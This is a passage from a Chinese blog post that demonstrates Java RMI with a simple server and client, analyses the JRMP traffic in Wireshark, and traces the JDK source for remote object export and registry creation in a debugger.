title="测试RMI"></a>测试RMI</h2><p>我创建了两个项目, 用于测试服务端和客户端</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>IHello.java 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer.java</p><ul><li><p>实现 <code>IHello</code> 远程接口, 实现<code>Registry</code></p></li><li><p>继承 <code>UnicastRemoteObject</code> 类，用于生成 Stub（存根）和 Skeleton（骨架）。</p></li><li><p>实现类中使用的对象必须都可序列化，即都继承<code>java.io.Serializable</code></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里bind有两种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>区别是一个需要加<code>rmi://0.0.0.0:1099/</code>一个不需要</p><p>我后面图片中可能有的地方书写有误, 不过bind的地方流程比较简单, 不影响分析</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。</p><p>当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>IHello.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(ihello.sayHello(<span class="string">&quot;hello, n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client成功调用了Server的对象和方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606144439733.png" alt="image-20240606144439733"></p><h2 id="JRMP协议分析"><a href="#JRMP协议分析" class="headerlink" title="JRMP协议分析"></a>JRMP协议分析</h2><p>我们将CLi端打包放进虚拟机中运行, 抓包分析rmi过程产生的流量,注意改一下ip</p><p>为cli项目添加入口类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新版本或适合您项目的版本 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 指定主类的全路径名称 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>org.rmi.RMIClient<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用maven打包即可</p><p>wireShark抓包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606155805887.png" alt="image-20240606155805887"></p><p>首先我们可以看见进行了TCP的三次握手, 建立了一条TCP链</p><p>其中192.168.1.11服务端, 192.168.244.128为客户端</p><p>这里我们也可以看见实际上是连接的1099端口(也就是Registry), 然后二者建立JRMP链接</p><p>随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”。我们看一下Registry的回复内容。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606160324349.png" alt="image-20240606160324349"></p><p>以下是ReturnData的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 97 34 1c 00 50 56 fb 95 99 08 00 45 00   ..).4..PV.....E.</span><br><span class="line">0010   01 5f ff 13 00 00 80 06 c3 a8 c0 a8 01 0b c0 a8   ._..............</span><br><span class="line">0020   f4 80 04 4b c3 b0 3e 74 47 95 a8 61 e0 04 50 18   ...K..&gt;tG..a..P.</span><br><span class="line">0030   fa f0 b2 f6 00 00 51 ac ed 00 05 77 0f 01 6e 7a   ......Q....w..nz</span><br><span class="line">0040   dd fb 00 00 01 8f ec 5e 33 e9 80 0e 73 7d 00 00   .......^3...s&#125;..</span><br><span class="line">0050   00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d   ....java.rmi.Rem</span><br><span class="line">0060   6f 74 65 00 0e 6f 72 67 2e 72 6d 69 2e 49 48 65   ote..org.rmi.IHe</span><br><span class="line">0070   6c 6c 6f 70 78 72 00 17 6a 61 76 61 2e 6c 61 6e   llopxr..java.lan</span><br><span class="line">0080   67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78 79 e1   g.reflect.Proxy.</span><br><span class="line">0090   27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68 74 00   &#x27;. ..C....L..ht.</span><br><span class="line">00a0   25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65 66 6c   %Ljava/lang/refl</span><br><span class="line">00b0   65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e 48 61   ect/InvocationHa</span><br><span class="line">00c0   6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a 61 76   ndler;pxpsr.-jav</span><br><span class="line">00d0   61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d   a.rmi.server.Rem</span><br><span class="line">00e0   6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63 61 74   oteObjectInvocat</span><br><span class="line">00f0   69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00 00 00   ionHandler......</span><br><span class="line">0100   00 02 02 00 00 70 78 72 00 1c 6a 61 76 61 2e 72   .....pxr..java.r</span><br><span class="line">0110   6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65   mi.server.Remote</span><br><span class="line">0120   4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e 03 00   Object.a...a3...</span><br><span class="line">0130   00 70 78 70 77 36 00 0a 55 6e 69 63 61 73 74 52   .pxpw6..UnicastR</span><br><span class="line">0140   65 66 00 0d 31 39 32 2e 31 36 38 2e 32 34 34 2e   ef..192.168.244.</span><br><span class="line">0150   31 00 00 f0 20 bb b8 2f e8 ae 23 c6 5f 6e 7a dd   1... ../..#._nz.</span><br><span class="line">0160   fb 00 00 01 8f ec 5e 33 e9 80 01 01 78            ......^3....x</span><br></pre></td></tr></table></figure><p>行0030 中<code>\xAC\xED</code>(ac ed)是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了.</p><p>行0150 中<code>\xF0 \x20</code>(f0 20)转换为十进制是61474, 这就是Server在本地开放的随机端口,这和之后与端口61474相对应</p><p>因此这条TCP链的作用就是Client根据传入的rmi地址链接远端服务器1099端口上的RMI Registry, 然后Registry向Client发送Server上的序列化数据，包括IP和开放的随机端口等。</p><p>再往下是第二个TCP链接, Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162034685.png" alt="image-20240606162034685"></p><p>之后是TCP四次挥手, 断开TCP连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162204581.png" alt="image-20240606162204581"></p><p>在此之中, Registry充当着类似网关的角色, 为Client返回远程对象的绑定信息, 然后Client的Stub连接位于Server上的Skeleton，最终远程方法还是在服务器上执行。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-81-1024x633.png" alt="图片-81-1024x633"></p><h2 id="RMI有关类介绍"><a href="#RMI有关类介绍" class="headerlink" title="RMI有关类介绍"></a>RMI有关类介绍</h2><h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p><code>LiveRef</code> 是 <code>java.rmi.server</code> 包中的一个类，负责管理远程对象的引用。它包括以下功能：</p><ol><li><strong>标识远程对象</strong>：每个远程对象在 JVM 中都有一个唯一的 <code>LiveRef</code> 实例，该实例用于唯一标识该远程对象。</li><li><strong>管理连接</strong>：维护客户端与远程对象之间的连接，确保远程对象的调用能够正确传递。</li><li><strong>引用计数</strong>：跟踪对远程对象的引用计数，以便在不再需要时正确地清理和回收资源。</li></ol><h4 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h4><p><code>UnicastRef</code> 负责处理远程方法调用的序列化和反序列化，将调用参数从客户端传输到服务器，并将结果从服务器返回给客户端。</p><p>它管理底层的网络连接和通信协议，确保远程方法调用能够正确地传递和处理。</p><p><code>UnicastRef</code> 包含一个 <code>LiveRef</code> 实例(封装)，<code>LiveRef</code> 保存了远程对象的引用信息，如对象标识符（<code>ObjID</code>）、远程对象所在的地址（<code>Endpoint</code>）、以及用于通信的底层通道。</p><h5 id="关键方法和属性"><a href="#关键方法和属性" class="headerlink" title="关键方法和属性"></a>关键方法和属性</h5><ul><li>**<code>newCall</code>**：创建一个新的远程调用。</li><li>**<code>invoke</code>**：执行远程调用。</li><li>**<code>done</code>**：完成远程调用并处理结果。</li></ul><h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p><code>UnicastServerRef</code> 是 Java RMI（Remote Method Invocation）框架中的一个类，用于管理<strong>单播</strong>远程对象的引用。在 Java RMI 中，远程对象需要被导出以便能够被远程调用，<code>UnicastServerRef</code> 类就是处理这些对象<strong>引用</strong>的主要类之一。</p><p>UnicastServerRef封装了LiveRef</p><blockquote><p>单播远程对象（Unicast Remote Object）是指在 RMI 中，一个特定的远程对象实例，只能在一个特定的地址（主机和端口）上被访问。与之相对的是多播对象（Multicast Object），后者可以通过多个路径访问。</p></blockquote><p><code>UnicastServerRef</code> 类是 <code>UnicastRef</code> 类的子类，继承了其一些基础功能，并添加了处理服务器端逻辑的功能。</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p><code>UnicastRemoteObject</code> 是一个便捷类，简化了创建远程对象的过程。它扩展了 <code>java.rmi.server.RemoteServer</code> 并实现了 <code>java.rmi.server.ServerRef</code> 接口</p><p><code>UnicastRemoteObject</code> 封装了 <code>UnicastServerRef</code> 的功能。</p><p>具体来说，当你创建一个 <code>UnicastRemoteObject</code> 时，它会在内部创建一个 <code>UnicastServerRef</code> 实例来处理实际的远程调用。</p><h4 id="RegistryImpl"><a href="#RegistryImpl" class="headerlink" title="RegistryImpl"></a>RegistryImpl</h4><p><code>RegistryImpl</code> 是 RMI 的一个内部实现类，它实现了<code>Registry</code>接口, 用于实现注册表服务。</p><p><code>RegistryImpl</code> 封装了<code>UnicastServerRef</code>, 使用 <code>UnicastServerRef</code> 来管理其自身的网络通信和远程对象引用。</p><h2 id="RMI流程源码分析"><a href="#RMI流程源码分析" class="headerlink" title="RMI流程源码分析"></a>RMI流程源码分析</h2><p>有了上面对于RMI流程的分析，下面我们根据源码来捋一捋信息是怎么在Server、Client与Registry中流动的。</p><p>其总体的一个调用方式是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1592803976000-5xjsli.png" alt="1592803976000-5xjsli"></p><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br></pre></td></tr></table></figure><h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>这里还是比较复杂, 我自己梳理了一下把关键步骤画了一个流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/rmi_server.jpg"></p><p>断点打在 RMIServer 的创建远程对象这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606170622577.png" alt="image-20240606170622577"></p><p>首先我们要分析的是一个远程对象是如何被发布到网络上去的</p><p><strong><code>RMIHello</code></strong> 这个类是继承于 <code>UnicastRemoteObject</code> 的，我们使用了父类的构造器来创建它。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606171457782.png" alt="image-20240606171457782"></p><p>这里exportObject表示导出(发布)这个对象自身(this)到0端口(后面会看见这其实表示随机端口),</p><p>F7跟进exportObject()</p><p><code>exportObject()</code> 是一个静态函数，它就是主要负责<strong>将远程服务发布到网络上</strong></p><p>第一个参数是 obj 对象，第二个参数是 <code>new UnicastServerRef(port)</code>，第二个参数是用来处理网络请求的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172149233.png" alt="image-20240606172149233"></p><p>这里实际上是一个动态代理中典型的封装操作, obj本身是一个要被发布出去的对象, 这个对象只在乎其包含了哪些功能, 对于如何发布它, 它如何与客户端进行网络请求并不关心, 因此这里的<code>UnicastServerRef</code>就是利用动态代理的方式来增强这个对象, 完成网络请求的功能</p><p>继续跟进<code>UnicastServerRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172355596.png" alt="image-20240606172355596"></p><p>它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172501903.png" alt="image-20240606172501903"></p><p>跟进去之后，先是一个构造函数，先跳进 this 看一看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172556199.png" alt="image-20240606172556199"></p><p>第一个参数 ID，第三个参数为 true，所以我们重点关注一下第二个参数。</p><blockquote><p>TCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172722549.png" alt="image-20240606172722549"></p><p>F8跳过这个方法, 继续F7进到 LiveRef 的构造函数 this 里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172942389.png" alt="image-20240606172942389"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606173251407.png" alt="image-20240606173251407"></p><p>此时发现 host 和 port 是赋值到了 endpoint 里面，而 endpoint 又是被封装在 LiveRef 里面的，</p><p>所以这些网络请求相关的数据是在 LiveRef 里面，并且这一 LiveRef 至始至终只会存在一个。</p><p>上述是 LiveRef 创建的过程，然后我们一路F8再回到之前出现 <code>LiveRef(port)</code> 的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174046968.png" alt="image-20240606174046968"></p><p>刚刚看完了new LiveRef() 的过程, 接下来F7到super中看一看它的父类 <code>UnicastRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174412573.png" alt="image-20240606174412573"></p><p>这里<code>UnicastServerRef</code> 是继承了<code>UnicastRef</code>,</p><p>此时<code>ref</code>这个属性就是对其在网络上的一个描述, 包括了其所开放在的ip与端口位置</p><p>一路 f7 回到exportObject()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174558218.png" alt="image-20240606174558218"></p><p>此前我们分析的是new UnicastServerRef(port)的过程, 继续F7</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174637562.png" alt="image-20240606174637562"></p><p>刚刚的sref(也就是对远程对象在网络上位置的描述)被赋值给了远程对象obj的ref属性</p><p>继续往后看, 进去下面那个<code>sref.exportObject()</code> 注意此时调用的是sref(也就是程序中新创建的)的方法, 并不是远程对象的属性ref</p><p>直到此处出现 Stub</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175005366.png" alt="image-20240606175005366"></p><p>Stub明明是Client中的存根, 为什么会出现在Server中呢?</p><blockquote><ul><li>RMI 先在 Service 的地方，也就是服务端创建一个 Stub，再把 Stub 传到 RMI Registry 中，最后让 RMI Client 去获取 Stub。</li></ul></blockquote><p>接着我们研究 Stub 产生的这一步，</p><p>先F8到197行, 再F7进到 <code>createProxy</code> 这个方法里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175626515.png" alt="image-20240606175626515"></p><p>注意: 这里的第二个参数<code>clientRef</code> 由<code>getClientRef()</code>产生, 通过观察变量值, 他与服务器上远程对象的ref属性是同一个</p><p>我们往下看, 这里并不会进去if里面, 先不看这个if</p><p> 可以看见下面有一个很明显的动态代理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175615840.png" alt="image-20240606175615840"></p><p>第一个参数是 <code>AppClassLoader</code>，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个 ref，它也是和之前我们看到的 ref 是同一个</p><p>创建远程服务当中永远只有一个 ref。</p><p>继续F8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205627290.png" alt="image-20240606205627290"></p><p>到这里就把动态代理创建好了，如图创建好了一个Stub等待客户端来获取(这个Stub并不包含远程对象本身)</p><p>继续 f8，到 Target 这里，Target 这里相当于一个总的封装，将所有用的东西放到 Target 里面，我们可以进去看一看 Target 里面都放了什么。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205812091.png" alt="image-20240606205812091"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205839158.png" alt="image-20240606205839158"></p><p>并且这里的几个 ref 都是同一个，通过 ID 就可以查看到它们是同一个。比如比较 disp 和 stub 的。一个是服务端 ，一个是客户端的，ID 是一样的，</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222744415.png" alt="image-20240606222744415"></p><p>一路 f8，回到之前的 Target，下一条语句是 <code>ref.exportObject(target)</code>，把 target 这个封装好了的对象发布出去。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222922598.png" alt="image-20240606222922598"></p><p>我们一路F7跟进, 直到这里的listen进行网络请求</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223026872.png" alt="image-20240606223026872"></p><p>继续F7跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223314933.png" alt="image-20240606223314933"></p><p>这里获取了<code>TCPEndpoint</code></p><p>我们F8进入到<code>server = ep.newServerSocket();</code>这里跟进</p><p>它创建了一个新的 socket，已经准备好了，等别人来连接</p><p>并且这个 <code>newServerSocket()</code> 方法会给 port 进行赋值, 若port被设置为0则随机赋一个值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223854543.png" alt="image-20240606223854543"></p><p>然后回到 listen 去，一路 f8，观察一下整个流程结束之后 Target 里面是增加了 port。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224204732.png" alt="image-20240606224204732"></p><h4 id="发布完成之后的记录"><a href="#发布完成之后的记录" class="headerlink" title="发布完成之后的记录"></a>发布完成之后的记录</h4><p>我们F7进去<code>super.exportObject(target);</code>这里, 也就是上一张图片的260行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224724277.png" alt="image-20240606224724277"></p><p>我们F7跟进<code>ObjectTable.putTarget(target);</code></p><p>进去后一路F8 </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225107839.png" alt="image-20240606225107839"></p><p>直到此处, RMI 这里会把所有的信息保存到<strong>两个 table</strong>里面</p><p>类似于日志, 这些记录是保存到静态的 HashMap 当中。</p><h3 id="创建注册中心-绑定"><a href="#创建注册中心-绑定" class="headerlink" title="创建注册中心 + 绑定"></a>创建注册中心 + 绑定</h3><p>我们使用<code>registry.bind</code>来注册, 断电打在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225831522.png" alt="image-20240606225831522"></p><p>可以看见<code>createRegistry</code>方法返回<code>RegistryImpl</code>对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606165122844.png" alt="image-20240606165122844"></p><p>F7进去, 有一大堆的安全验证不太重要直接F8过了</p><p>直到<code>RegistryImpl</code>, 我们F7进去</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231221520.png" alt="image-20240606231221520"></h3><p>这里有一步判断 port 是否为注册中心的 port</p><p>再往下走，它创建了一个 <code>LiveRef</code>，以及创建了一个新的 <code>UnicastServerRef</code>，这段代码就和我们上面讲的创建远程对象是很类似的，我们可以跟进 <code>setup</code> 看一下</p><p>跟进之后发现和之前是一样的，也是先赋值，然后进行 <code>exportObject()</code> 方法的调用。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231642087.png" alt="image-20240606231642087"></p><p>我们还是F7进入<code>exportObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607184256288.png" alt="image-20240607184256288"></p><p>到了创建 Stub 的阶段。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185404298.png" alt="image-20240607185404298"></p><p>这里与发布对象时有所不同, 这里会进到<code>createStub</code>这个函数中, 发布对象时不进入这个if, 